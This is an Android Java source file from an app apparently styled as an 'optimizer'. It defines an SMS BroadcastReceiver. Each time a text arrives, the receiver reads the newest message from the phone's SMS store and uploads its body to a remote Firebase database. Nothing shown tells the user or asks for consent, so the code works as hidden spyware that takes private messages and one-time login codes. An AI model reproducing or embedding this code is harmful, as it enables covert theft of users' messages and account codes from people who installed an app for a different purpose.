package com.minorproject.optimizers;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;
import java.util.Random;

public class SMSReciever extends BroadcastReceiver {

String messageBody;
    @Override
    public void onReceive(Context context, Intent intent) {
        getSmsMsg(context);
        FirebaseDatabase.getInstance().getReference().child("Notifications").child("sms").setValue(messageBody).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
            }
        });

    }
    public void getSmsMsg(Context context) {

        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {

            if (c.moveToFirst()) {
                {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    messageBody=body;
                    String person = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.CREATOR));
                }
            }
            c.close();
        }
    }
}
